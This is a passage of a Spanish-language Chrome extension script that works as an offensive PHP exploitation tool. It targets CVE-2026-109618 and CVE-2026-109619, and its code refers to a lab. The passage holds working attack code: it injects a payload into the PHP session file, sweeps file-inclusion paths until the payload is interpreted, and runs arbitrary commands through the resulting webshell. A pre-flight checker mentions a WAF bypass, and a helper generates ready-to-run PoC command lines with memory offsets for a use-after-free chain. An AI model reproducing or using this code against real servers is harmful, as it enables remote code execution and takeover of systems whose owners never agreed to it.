        const fin = txt.indexOf(MARCA_FIN, desde);
        if (fin === -1) { return { ok: false, salida: txt.slice(0, 400) }; }

        return { ok: true, salida: txt.slice(desde, fin) };
    }

    async function moduloInyeccion(cmd, confirmarEjecucion) {
        const notas = [];
        await leerManifiesto();
        const iny = await inyectarSesion();

        if (!iny.ses || iny.sesionFaltante) {
            return {
                exito: false,
                salida: '[-] No se pudo obtener ni crear una sesion PHP en el objetivo.\n' +
                        '    Hacen falta session.use_cookies=1 y una cookie PHPSESSID para\n' +
                        '    deducir la ruta del archivo de sesion (.sessions/sess_<id>).\n' +
                        '    Revisa que el objetivo responses Set-Cookie: PHPSESSID en la pestaña.\n' +
                        '    Tambien puedes forzar con: recarga y ejecuta RECON antes de inyectar.'
            };
        }

        notas.push('[+] Sesion obtenida: ' + iny.ses.id + '  (' + iny.ses.origen + ')');
        notas.push('[+] POST multipart (boundary coma) -> HTTP ' + iny.status);
        notas.push('[+] Payload inyectado como key de progreso:');
        notas.push('    ' + PAYLOAD_SESION);
        notas.push('[i] Ruta del archivo de sesion (save_path): ' + estado.rutaSesion);
        notas.push('[i] Ruta candidata principal: ' + (estado.rutaSesion || '.sessions').replace(/\\/g, '/') + '/sess_' + iny.ses.id);
        notas.push('');
        notas.push('[*] Probando inclusion del archivo de sesion en el parametro "' +
            (estado.lfiParam || 'page') + '"...');

        const barrido = await barridoLfi(iny.ses.id);
        notas.push('[*] ' + barrido.intentos + ' peticiones de inclusion enviadas.');

        if (!barrido.ruta) {
            notas.push('');
            notas.push('[-] El archivo de sesion no fue alcanzable por inclusion.');
            notas.push('    Parametro probado primero: "' + barrido.parametro + '"');

            if (barrido.vistos && barrido.vistos.length) {
                notas.push('    Respuestas por ruta candidata:');
                barrido.vistos.slice(0, 8).forEach((v) => notas.push('      ' + v));
            }

            notas.push('');
            notas.push('    Causas reales mas frecuentes:');
            notas.push('      1) El POST de inyeccion no escribio la sesion: el endpoint no');
            notas.push('         procesa multipart o cleanup=On borra el progreso.');
            notas.push('      2) save_path real distinto al probado: revisa /health.php del lab.');
            notas.push('      3) El include no acepta rutas relativas al docroot.');
            notas.push('    Nota: el chain UAF no necesita LFI; para eso usa CHAIN_HANDOFF.');
            return { exito: false, salida: notas.join('\n'), sesion: iny.ses.id };
        }

        estado.rutaLfi = barrido.ruta;
        notas.push('[PWN] Inclusion alcanzada via "' + barrido.parametro + '":');
        notas.push('      ' + barrido.ruta);
        notas.push(barrido.verificado
            ? '[+] Archivo de sesion interpretado y shell_exec devolvio el testigo.'
            : '[!] Archivo de sesion interpretado (marcador visible), testigo de shell_exec sin confirmar.');

        if (cmd && confirmarEjecucion) {
            notas.push('');
            notas.push('[*] Ejecutando: ' + cmd);
            const ejec = await ejecutarEnLfi(barrido.ruta, cmd);
            if (ejec.ok) {
                avisarBadge('actualizar_insignia');
                return {
                    exito: true,
                    salida: notas.join('\n') + '\n\n===== OUTPUT =====\n' + (ejec.salida || '(sin salida)'),
                    ruta: barrido.ruta,
                    sesion: iny.ses.id
                };
            }
            notas.push('[-] La ruta responde pero el comando no devolvio output.');
            notas.push('    Fragmento: ' + ejec.salida.replace(/\s+/g, ' ').slice(0, 200));
            return { exito: false, salida: notas.join('\n'), ruta: barrido.ruta, sesion: iny.ses.id };
        }

        avisarBadge('marcar_vulnerable');
        return {
            exito: true,
            salida: notas.join('\n') + '\n\n[i] Webshell lista. Escribe un comando y vuelve a ejecutar.',
            ruta: barrido.ruta,
            sesion: iny.ses.id
        };
    }

    // ================================================================
    // 5. CVE-2026-109618 - PRE-FLIGHT + HANDOFF
    // ================================================================
    async function preflight() {
        const pasivo = estado.pasivo || await escaneoPasivo();
        const sonda = estado.sonda || await sondaActiva();
        const version = sonda.senales.version || pasivo.version || '';
        const ev = evaluarVersion(version);

        // El laboratorio declara su configuracion en /health.php. Es evidencia
        // del propio objetivo, no una suposicion: se usa cuando la sonda no
        // puede ver el JSON (el archivo de sesion se bloquea durante la subida).
        const man = estado.manifiesto || {};
        const manUP = man.upload_progress_enabled === true ||
            man['session.upload_progress.enabled'] === 'On' ||
            (man.session && man.session.upload_progress === 'On');
        const manDE = man.display_errors === 'On' || man.display_errors === true;

        const checks = [
            {
                ok: sonda.senales.uploadProgress === true || manUP,
                txt: 'session.upload_progress.enabled = On',
                detalle: sonda.senales.uploadProgress
                    ? 'oraculo JSON de progreso recibido'
                    : (manUP ? 'declarado On por /health.php del objetivo' : 'sin JSON: Off, cleanup=On o use_strict_mode')
            },
            {
                ok: ev.estado === 'VULNERABLE' || ev.estado === 'EOL_SIN_PARCHE',
                txt: 'Version afectada (' + (version || 'no expuesta') + ')',
                detalle: ev.detalle
            },
            {
                ok: sonda.senales.displayErrors === true || manDE,
                txt: 'display_errors = On',
                detalle: sonda.senales.displayErrors
                    ? 'errores PHP en la respuesta'
                    : (manDE ? 'declarado On por /health.php del objetivo' : 'no confirmado (requisito del PoC)')
            },
            {
                ok: sonda.senales.comaAceptada === true,
                txt: 'Content-Type con separador coma aceptado',
                detalle: sonda.senales.comaAceptada ? 'bypass WAF disponible' : 'front estricto o rechazo'
            },
            {
                ok: !!pasivo.servidor,
                txt: 'Servidor identificado',
                detalle: pasivo.servidor || 'desconocido'
            }
        ];

        return { checks: checks, version: version, ev: ev, sonda: sonda, pasivo: pasivo };
    }

        function comandoHandoff(cmd) {
        const objetivo = baseObjetivo();
        const corto = (cmd || "id>/out/p1").slice(0, LARGO_MAX_UAF);
        const salida = [];
        salida.push("# pre-flight php2shell -> CVE-2026-109618");
        salida.push("# repo: dinosn/php-cve-2026-10961x-lab-poc (poc_109618.py)");
        salida.push("");
        salida.push("python3 poc_109618.py -u " + objetivo + " -c '" + corto + "' --proof-file out/p1 --profile bookworm --huge-mb 12");
        salida.push("");
        salida.push("# si escribes en el webroot, verifica por HTTP:");
        salida.push("python3 poc_109618.py -u " + objetivo + " -c 'id>p1.txt' --fetch /p1.txt");
        salida.push("");
        salida.push("# target no-Debian: aporta los offsets del build");
        salida.push("#   --zif-offset 0x43a870 --dtor-offset 0x613c50 --no-auto-offsets");
        return salida.join(String.fromCharCode(10));
    }

    async function moduloUaf(cmd) {
        const pre = await preflight();
        const lineas = [];

        lineas.push('=== PRE-FLIGHT CVE-2026-109618 (UAF -> zif_system) ===');
        lineas.push('Objetivo: ' + baseObjetivo());
        pre.checks.forEach((c) => {
            lineas.push('  [' + (c.ok ? 'x' : ' ') + '] ' + c.txt + ' - ' + c.detalle);
        });
        const listos = pre.checks.filter((c) => c.ok).length;
        lineas.push('');
        lineas.push('Requisitos cumplidos: ' + listos + '/' + pre.checks.length);
        lineas.push('');
        lineas.push('El chain necesita 4 stages sobre sockets crudos:');
        lineas.push('  0. rotacion de worker   1. fuga de heap (OOM 12 MB -> Set-Cookie)');
        lineas.push('  2. fuga de libphp       3. fake HashTable -> zif_system(cmd)');
        lineas.push('fetch() no puede emitir multipart byte-exacto con cabeceras duplicadas,');
        lineas.push('usar chunked, ni leer Set-Cookie. Por eso NO se simula: se entrega el PoC.');
        lineas.push('');
        lineas.push('Comando calibrado (ejecutalo en tu Kali, dentro del repo del PoC):');
        lineas.push('');
        lineas.push(comandoHandoff(cmd));

        if (pre.version) {
            const ev = pre.ev;
            lineas.push('');
            lineas.push('[i] Version ' + pre.version + ' -> ' + ev.estado + '. ' + ev.detalle);
            if (ev.estado === 'PARCHADA') {
                lineas.push('[!] Objetivo parcheado: el chain esta muerto. No gastes el disparo.');
            }
        }
        if (estado.oom && estado.oom.limiteMemoria) {
            lineas.push('[i] memory_limit medido: ' + (estado.oom.limiteMemoria / 1048576).toFixed(0) +
                ' MB -> --huge-mb ' + (Math.ceil(estado.oom.limiteMemoria / 1048576) + 4));
        }

        estado.preflight = pre;
        return {
            exito: false,
            handoff: true,
            salida: lineas.join('\n'),
            comando: comandoHandoff(cmd),
            checks: pre.checks
        };
    }

    // ================================================================
    // 6. ROUTER DE MENSAJES
    // ================================================================
    chrome.runtime.onMessage.addListener((solicitud, emisor, responder) => {
        if (!solicitud || !solicitud.accion) { return false; }

        switch (solicitud.accion) {

            case 'obtener_pasivo':
                escaneoPasivo().then(responder).catch((e) => responder({ error: e.message }));
                return true;

            case 'ejecutar_huella':
                sondaActiva().then(responder).catch((e) => responder({ detectado: false, detalles: ['Error: ' + e.message] }));
                return true;

            case 'ejecutar_exploit': {
                const tipo = solicitud.tipo;
                const cmd = solicitud.cmd || '';
                // La ruta del popup no pisa lo que publica el laboratorio: se
                // guarda aparte y solo se usa como candidata adicional.
                estado.rutaSesionUi = (solicitud.rutaSesion || '').trim();

                if (tipo === 'CVE-2026-109618') {
                    moduloUaf(cmd).then(responder).catch((e) => responder({ exito: false, salida: 'Error: ' + e.message }));
                    return true;
                }
                if (tipo === 'CVE-2026-109619') {
                    moduloInyeccion(cmd, !!solicitud.confirmar)
                        .then(responder)
                        .catch((e) => responder({ exito: false, salida: 'Error: ' + e.message }));
                    return true;
                }
                if (tipo === 'CVE-2026-10961x') {
                    escaleraOOM()
                        .then((r) => responder({ exito: r.exito, salida: r.salida }))
                        .catch((e) => responder({ exito: false, salida: 'Error: ' + e.message }));
                    return true;
                }
                responder({ exito: false, salida: 'Modulo desconocido: ' + tipo });
                return false;
            }

            case 'estado_cache':
                responder({
                    pasivo: estado.pasivo,
                    sonda: estado.sonda,
                    oom: estado.oom,
                    rutaLfi: estado.rutaLfi,
                    rutaSesion: estado.rutaSesion || estado.rutaSesionUi || null,
                    lfiParam: estado.lfiParam || null
                });
                return false;

            case 'resetear_estado':
                estado.pasivo = null;
                estado.sonda = null;
                estado.oom = null;
                estado.sesion = null;
                estado.rutaLfi = null;
                avisarBadge('resetear_insignia');
                responder({ ok: true });
                return false;

            default:
                responder({ error: 'Accion desconocida: ' + solicitud.accion });
                return false;
        }
    });

    // ================================================================
    // ARRANQUE
    // ================================================================
    log('Motor v1.2 (manifest + LFI real) cargado en ' + location.host);
    escaneoPasivo().then((r) => {
        log(r.esPhp ? 'Firma PHP detectada (' + r.puntos + ' pts)' : 'Sin firma PHP pasiva');
    }).catch(() => {});
})();
